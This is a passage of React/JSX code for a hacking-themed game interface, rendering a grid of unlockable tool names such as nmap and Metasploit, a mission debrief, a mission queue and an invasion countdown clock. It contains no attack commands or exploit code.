                <div className="hack-sub">Offensive security tools available to SPECTER-7</div>
                <div className="asset-grid">
                  {[
                    { icon: "🔍", name: "nmap", desc: "Port/vuln scan", u: true },
                    { icon: "🦈", name: "Wireshark", desc: "Packet capture", u: true },
                    { icon: "📡", name: "aircrack-ng", desc: "WPA2 cracker", u: unlocked.includes("economy") },
                    { icon: "💉", name: "sqlmap", desc: "SQL injection", u: unlocked.includes("economy") },
                    { icon: "🦎", name: "Metasploit", desc: "Exploit shell", u: unlocked.includes("comms") },
                    { icon: "🔓", name: "Hydra", desc: "Brute forcer", u: unlocked.includes("comms") },
                    { icon: "🔑", name: "John the Ripper", desc: "Hash cracker", u: unlocked.includes("grid") },
                    { icon: "📦", name: "Scapy", desc: "Packet forge", u: unlocked.includes("grid") },
                    { icon: "🔐", name: "OpenSSL", desc: "Decrypt files", u: unlocked.includes("command") },
                    { icon: "🌐", name: "curl/ffmpeg", desc: "Data transfer", u: true },
                  ].map((a, i) => (
                    <div key={i} className={`asset-card ${a.u ? "unlocked" : ""}`}>
                      <div className="asset-icon">{a.icon}</div>
                      <div className="asset-name">{a.name}</div>
                      <div className={`asset-cd ${a.u ? "ready" : ""}`}>{a.desc}</div>
                    </div>
                  ))}
                </div>
                <div style={{ marginTop: 16 }}>
                  <PBar label="COVER INTEGRITY" value={10 - threat} max={10} color={threat > 6 ? "red" : "green"} />
                  <PBar label="XP EARNED" value={xp} max={totalXP} color="yellow" />
                </div>
              </div>
            )}

            {/* DEBRIEF */}
            {nav === "debrief" && (
              <div className="story-panel">
                <div className="story-chapter">MISSION DEBRIEF</div>
                <div className="story-title">Operation Status Log</div>
                {MISSIONS.map((m, i) => (
                  <div key={i} style={{ marginBottom: 16, opacity: completed.includes(m.id) ? 1 : .3 }}>
                    <div style={{ fontFamily: "Orbitron", fontSize: ".7rem", color: completed.includes(m.id) ? "var(--accent3)" : "var(--dim)", letterSpacing: ".2em", marginBottom: 4 }}>
                      {m.icon} {m.name} {completed.includes(m.id) ? "— COMPLETE" : "— PENDING"}
                    </div>
                    {completed.includes(m.id) && <div className="story-para">{m.storyAfter}</div>}
                  </div>
                ))}
              </div>
            )}
          </div>

          <div className="side-panel">
            <div className="sp-section">
              <div className="sp-title">LIVE STATUS</div>
              {[
                { d: "", v: "KAIROS: ONLINE (94%)" },
                { d: "yellow", v: "SENTINEL: ACTIVE" },
                { d: "green", v: "Allied ops: HOLDING" },
                { d: "green", v: "ICC relay: READY" },
              ].map((item, i) => (
                <div key={i} className="intel-item">
                  <div className={`intel-dot ${item.d}`} />
                  <div style={{ fontSize: ".68rem" }}>{item.v}</div>
                </div>
              ))}
            </div>
            <div className="sp-section">
              <div className="sp-title">MISSION QUEUE</div>
              {MISSIONS.map((m, i) => {
                const done = completed.includes(m.id);
                const lock = !unlocked.includes(m.id);
                return (
                  <div key={i} style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8, opacity: lock ? .35 : 1, cursor: "pointer" }}
                    onClick={() => setNav("map")}>
                    <span>{m.icon}</span>
                    <span style={{ fontSize: ".62rem", flex: 1, color: done ? "var(--accent3)" : lock ? "var(--dim)" : "var(--text)" }}>{m.name}</span>
                    <span style={{ fontSize: ".6rem", color: done ? "var(--accent3)" : lock ? "var(--dim)" : "var(--accent4)" }}>{done ? "✓" : lock ? "🔒" : "▶"}</span>
                  </div>
                );
              })}
            </div>
            <div className="sp-section">
              <div className="sp-title">INVASION CLOCK</div>
              <div style={{ fontFamily: "Orbitron", fontSize: "1.6rem", color: invHrs < 24 ? "var(--accent2)" : "var(--accent4)", letterSpacing: ".1em" }}>
                {String(invHrs).padStart(2, "0")}:00:00
              </div>
              <div style={{ fontSize: ".58rem", color: "var(--dim)", marginTop: 4, letterSpacing: ".2em" }}>HRS UNTIL INVASION</div>
            </div>
            {hacking && curMission && (
              <div className="sp-section">
                <div className="sp-title">ACTIVE HACK</div>
                <div style={{ fontSize: ".65rem", color: "var(--accent)", fontFamily: "Orbitron", letterSpacing: ".1em" }}>{curMission.name}</div>
                <div style={{ fontSize: ".6rem", color: "var(--dim)", marginTop: 4 }}>{curMission.target}</div>
                <div style={{ marginTop: 8, display: "flex", gap: 4, flexWrap: "wrap" }}>
                  {TERMINAL_MISSIONS[curMission.id].toolsUsed.map((t, i) => (
                    <span key={i} style={{ fontSize: ".52rem", color: "var(--accent4)", border: "1px solid #2a3a10", padding: "2px 4px" }}>{t}</span>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
